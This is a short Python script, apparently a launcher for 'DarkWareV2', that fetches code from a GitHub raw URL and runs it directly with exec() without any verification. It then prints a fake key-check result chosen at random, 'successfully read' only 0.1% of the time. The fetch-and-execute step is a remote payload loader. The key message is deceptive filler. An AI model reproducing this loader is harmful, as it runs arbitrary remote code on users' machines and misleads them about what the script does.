import requests
import random

raw_url = "https://raw.githubusercontent.com/DarkWareV2/DarkWareV2Scripts/main/DarkWareV2Ui.py"

try:
    response = requests.get(raw_url)
    response.raise_for_status()  
    
    exec(response.text)
    
    print("Script executed successfully.")
    
except requests.RequestException as e:
    print(f"Error fetching script: {e}")

except Exception as e:
    print(f"Error executing script: {e}")

# 0.1% chance to print "key has been successfully read"
if random.random() < 0.001:
    print("key has been successfully read")
else:
    print("key has been unsuccessfully read")
